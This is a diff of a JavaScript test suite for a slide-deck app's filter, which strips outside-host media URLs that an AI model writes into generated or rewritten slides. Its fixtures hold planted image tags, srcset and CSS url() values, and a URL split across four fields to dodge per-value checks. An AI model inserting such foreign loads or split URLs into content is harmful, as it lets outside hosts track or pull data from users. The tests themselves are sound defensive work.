+  };
+  assert.ok(
+    plantedLoads(renderSlideHtml(glued, { slideTypes: srcset })).length > 0,
+  );
+  for (const form of ['a leading comma', 'two leading commas']) {
+    const leading = {
+      type: 'custom-hero',
+      content: { title: 'x', photo: SECOND_ADDRESS_FORMS[form] },
+    };
+    for (const where of [
+      'an image with a srcset',
+      'a srcset with width variants',
+      'a srcset, second candidate',
+      'a picture source',
+    ]) {
+      const types = heroTypes(MEDIA_TEMPLATES[where]);
+      assert.ok(
+        plantedLoads(renderSlideHtml(leading, { slideTypes: types })).length >
+          0,
+        `the oracle reads ${form} in ${where}`,
+      );
+    }
+  }
+  const css = heroTypes(MEDIA_TEMPLATES['a quoted CSS url()']);
+  const layered = {
+    type: 'custom-hero',
+    content: {
+      title: 'x',
+      photo: SECOND_ADDRESS_FORMS['an apostrophe, a second layer'],
+    },
+  };
+  assert.ok(
+    plantedLoads(renderSlideHtml(layered, { slideTypes: css })).length > 0,
+  );
+});
+
+/** A database type whose list renders each body as markup. */
+function feedTypes() {
+  const def = toRuntimeSlideType({
+    id: 'cst-feed',
+    slug: 'feed',
+    label: 'Feed',
+    fields: [
+      { key: 'title', type: 'string', label: 'Title' },
+      {
+        key: 'rows',
+        type: 'items',
+        label: 'Rows',
+        itemFields: [
+          { key: 'head', type: 'string', label: 'Head' },
+          { key: 'body', type: 'string', label: 'Body' },
+        ],
+      },
+    ],
+    defaults: { title: '', rows: [] },
+    template:
+      '<div class="slide"><h2>{{esc title}}</h2>{{#each rows}}<h3>{{esc this.head}}</h3><div>{{raw this.body}}</div>{{/each}}</div>',
+  });
+  return { ...TYPES, 'custom-feed': def };
+}
+
+const feed = (n) => ({
+  type: 'custom-feed',
+  content: {
+    title: 'Feed',
+    rows: Array.from({ length: n }, (_, i) => ({
+      head: `Kop ${i}`,
+      body: `<img src="https://${HOST}/p?i=${i}">`,
+    })),
+  },
+});
+
+test('many values that each load are judged in time, and past the budget the rest goes', () => {
+  const types = feedTypes();
+  // Within the budget: each body goes, each head stays.
+  const some = feed(30);
+  dropForeignMedia([some], { slideTypes: types });
+  assert.ok(some.content.rows.every((row) => row.body === ''));
+  assert.ok(some.content.rows.every((row, i) => row.head === `Kop ${i}`));
+
+  // Past it, and a deck of such slides: in time, and nothing loads.
+  const many = [feed(300), feed(100), feed(100), feed(100)];
+  const started = performance.now();
+  dropForeignMedia(many, { slideTypes: types });
+  const ms = performance.now() - started;
+  assert.ok(ms < 8000, `four slides of 600 rows took ${Math.round(ms)} ms`);
+  for (const slide of many) {
+    assert.ok(slide.content.rows.every((row) => row.body === ''));
+    assert.deepEqual(
+      plantedLoads(renderSlideHtml(slide, { slideTypes: types })),
+      [],
+    );
+  }
+  assert.ok(MAX_SEARCH_CHARS > 0);
+});
+
+/** `bytes` of the densest markup there is, eight bytes an element. */
+const dense = (bytes) => '<b>x</b>'.repeat(Math.floor(bytes / 8));
+
+test('a heavy slide where only the last value loads is judged in bounded time', () => {
+  // Review 2 of DY-863, probe R: the cost of a render is the slide, so a
+  // search that renders the whole slide per value grows with values × size.
+  const types = feedTypes();
+  const rows = 124;
+  const slide = {
+    type: 'custom-feed',
+    content: {
+      title: 'Feed',
+      rows: Array.from({ length: rows }, (_, i) => ({
+        head: `Kop ${i}`,
+        body:
+          dense((24 * 1024) / rows) +
+          (i === rows - 1 ? `<img src="https://${HOST}/p">` : ''),
+      })),
+    },
+  };
+  const written = structuredClone(slide.content.rows);
+  const started = performance.now();
+  dropForeignMedia([slide], { slideTypes: types });
+  const ms = performance.now() - started;
+  assert.ok(ms < 3000, `24 KB in 124 rows took ${Math.round(ms)} ms`);
+  assert.equal(slide.content.rows.at(-1).body, '');
+  assert.deepEqual(slide.content.rows.slice(0, -1), written.slice(0, -1));
+  assert.equal(slide.content.rows.at(-1).head, `Kop ${rows - 1}`);
+  assert.deepEqual(
+    plantedLoads(renderSlideHtml(slide, { slideTypes: types })),
+    [],
+  );
+});
+
+test("a person's large slide with a few short rows added is judged in bounded time", () => {
+  const types = feedTypes();
+  const person = {
+    type: 'custom-feed',
+    content: {
+      title: 'Feed',
+      rows: Array.from({ length: 40 }, (_, i) => ({
+        head: `Eigen ${i}`,
+        body: dense((24 * 1024) / 40) + `<i>${i}</i>`,
+      })),
+    },
+  };
+  const keep = heldInSlides([person], types);
+  const slide = structuredClone(person);
+  for (let i = 0; i < 124; i += 1) {
+    slide.content.rows.push({
+      head: `Nieuw ${i}`,
+      body: i === 123 ? `<img src="https://${HOST}/p">` : `tekst ${i}`,
+    });
+  }
+  const started = performance.now();
+  dropForeignMedia([slide], { slideTypes: types, keep });
+  const ms = performance.now() - started;
+  assert.ok(ms < 3000, `a held 24 KB slide took ${Math.round(ms)} ms`);
+  assert.deepEqual(slide.content.rows.slice(0, 40), person.content.rows);
+  assert.equal(slide.content.rows.at(-1).body, '');
+  assert.equal(slide.content.rows.at(-2).body, 'tekst 122');
+  assert.ok(
+    slide.content.rows.slice(40).every((row, i) => row.head === `Nieuw ${i}`),
+  );
+});
+
+test('values that load only together are all emptied', () => {
+  // The search renders each group on its own; two values that pass apart
+  // and load together fail the render of the slide as kept.
+  const split = toRuntimeSlideType({
+    id: 'cst-split2',
+    slug: 'split2',
+    label: 'Split',
+    fields: [
+      { key: 'a', type: 'string', label: 'a' },
+      { key: 'b', type: 'string', label: 'b' },
+      { key: 'c', type: 'string', label: 'c' },
+      { key: 'd', type: 'string', label: 'd' },
+    ],
+    defaults: {},
+    template:
+      '<div class="slide"><img src="{{raw a}}{{raw b}}{{raw c}}{{raw d}}" alt=""></div>',
+  });
+  const types = { ...TYPES, 'custom-split2': split };
+  const slide = {
+    type: 'custom-split2',
+    content: { a: 'https:', b: '/', c: `/${HOST}`, d: '/p.png' },
+  };
+  dropForeignMedia([slide], { slideTypes: types });
+  // `https:` loads on its own; `/`, `/host` and `/p.png` pass apart, and
+  // together with nothing else make `//host/p.png`.
+  assert.deepEqual(slide.content, { a: '', b: '', c: '', d: '' });
+  assert.deepEqual(
+    plantedLoads(renderSlideHtml(slide, { slideTypes: types })),
+    [],
+  );
+});
+
+test('a list the type keeps from the model stays when it was held there', () => {
+  const def = toRuntimeSlideType({
+    id: 'cst-credits',
+    slug: 'credits',
+    label: 'Credits',
+    fields: [
+      { key: 'title', type: 'string', label: 'Title' },
+      {
+        key: 'sponsors',
+        type: 'items',
+        label: 'Sponsors',
+        ai: false,
+        itemFields: [{ key: 'name', type: 'string', label: 'Name' }],
+      },
+    ],
+    defaults: { title: '', sponsors: [] },
+    template:
+      '<div class="slide"><h2>{{esc title}}</h2>{{#each sponsors}}<p>{{esc this.name}}</p>{{/each}}</div>',
+  });
+  const types = { ...TYPES, 'custom-credits': def };
+  const shown = {
+    type: 'custom-credits',
+    content: {
+      title: 'Dank',
+      sponsors: [{ name: 'Gemeente' }, { name: 'Fonds' }],
+    },
+  };
+  const keep = heldInSlides([shown], types);
+  const handedBack = structuredClone(shown);
+  handedBack.content.title = 'Met dank aan';
+  dropForeignMedia([handedBack], { slideTypes: types, keep });
+  assert.deepEqual(handedBack.content.sponsors, shown.content.sponsors);
+  assert.equal(handedBack._aiWarnings, undefined);
+
+  // The same list with the keys of an entry in another order is the same list.
+  const reordered = structuredClone(shown);
+  reordered.content.sponsors = [{ name: 'Gemeente' }, { name: 'Fonds' }].map(
+    (sponsor) => ({ note: '', ...sponsor }),
+  );
+  const shownWithNote = structuredClone(shown);
+  shownWithNote.content.sponsors = shownWithNote.content.sponsors.map(
+    (sponsor) => ({ ...sponsor, note: '' }),
+  );
+  const keepWithNote = heldInSlides([shownWithNote], types);
+  dropForeignMedia([reordered], { slideTypes: types, keep: keepWithNote });
+  assert.deepEqual(
+    reordered.content.sponsors,
+    [
+      { note: '', name: 'Gemeente' },
+      { note: '', name: 'Fonds' },
+    ],
+    'keys in another order',
+  );
+  assert.equal(reordered._aiWarnings, undefined);
+
+  const changed = structuredClone(shown);
+  changed.content.sponsors.push({ name: 'Een eigen sponsor' });
+  dropForeignMedia([changed], { slideTypes: types, keep });
+  assert.deepEqual(changed.content.sponsors, []);
+  assert.match(changed._aiWarnings.join(' '), /left to people/);
+});
+
+test('the rule asks for what heldInSlides gives', () => {
+  assert.throws(
+    () => dropForeignMedia([], { slideTypes: TYPES, keep: new Set() }),
+    /heldInSlides/,
+  );
 });
 
 // ── What the slide renders ──────────────────────────────────────────────────
@@ -857,7 +1764,7 @@ test('a media field with anything but a string is emptied, and a required one le
   ];
   const unusable = dropForeignMedia(slides, {
     slideTypes: SLIDE_TYPES,
-    keep: mediaInSlides(heldSlides(), SLIDE_TYPES),
+    keep: heldInSlides(heldSlides(), SLIDE_TYPES),
   });
   assert.equal(slides[0].content.members[0].image, '');
   assert.equal(slides[1].content.embedUrl, '');
@@ -871,7 +1778,7 @@ test('a held value is held in every spelling the slide uses it in', () => {
   ];
   dropForeignMedia(slides, {
     slideTypes: SLIDE_TYPES,
-    keep: mediaInSlides(heldSlides(), SLIDE_TYPES),
+    keep: heldInSlides(heldSlides(), SLIDE_TYPES),
   });
   assert.equal(slides[0].content.image, `\u00a0${HELD_IMAGE}\u3000`);
 });
@@ -995,10 +1902,12 @@ function generationAnswer(body) {
 const appendAnswer = () => ({ rationale: 'Added.', slides: planted() });
 
 test('generation: a new deck holds no URL the model wrote', async (t) => {
+  await setup();
   stubModel(t, generationAnswer);
   const deck = await generateDeck('The year in four slides.', {
     lang: 'en-GB',
-    slideTypes: SLIDE_TYPES,
+    slideTypes: TYPES,
+    ...(await loadSlideTypeOffer(scope())),
   });
   assertPlantedTypes(deck.slides, 'generation');
   assertNothingPlanted(deck.slides, 'generation');
@@ -1178,6 +2087,39 @@ test('iterate, one slide: the rewritten slide keeps its own image only', async (
         );
       }
       assertRendersNothingPlanted([slide], `editor iterate, ${form}`);
+    });
+  }
+});
+
+test('iterate, one slide: a rewrite into markup or a library of its own loads neither', async (t) => {
+  const answers = {
+    markup: {
+      type: NOTES_TYPE,
+      content: { title: 'Notes', body: PLANTED_MARKUP, photo: IMAGE },
+    },
+    library: {
+      type: 'video-slide',
+      content: {
+        title: 'A film',
+        source: 'a-bare-video-id',
+        bunnyLibraryId: PLANTED_LIBRARY,
+      },
+    },
+  };
+  for (const [name, answer] of Object.entries(answers)) {
+    await t.test(name, async (st) => {
+      const deck = await setup();
+      stubModel(st, () => answer);
+      const result = await callRoute(handleAiIterate, {
+        presentation: deck,
+        command: 'Make this different',
+        currentSlideIndex: 2,
+      });
+      const slide = result.presentation.slides[2];
+      assert.equal(slide.type, answer.type, 'the rewrite came back');
+      assertNothingPlanted(result, `editor iterate, ${name}`);
+      assertRendersNothingPlanted([slide], `editor iterate, ${name}`);
+      assert.equal(slide.content.bunnyLibraryId || '', '');
     });
   }
 });
@@ -1388,8 +2330,12 @@ test('analysis: a proposed slide holds what the deck held, nothing new', async (
   }));
   const { suggestions } = await analyzePresentation(deck, {
     vendor: 'openai',
-    slideTypes: SLIDE_TYPES,
+    slideTypes: TYPES,
+    ...(await loadSlideTypeOffer(scope())),
   });
+  const notes = suggestions.find((s) => s.proposedSlide?.type === NOTES_TYPE);
+  assert.ok(notes, 'the proposal of a type from the database stays');
+  assert.equal(notes.proposedSlide.content.body, '', 'its markup is gone');
   assert.equal(
     suggestions.length,
     3 + planted().length - 4,
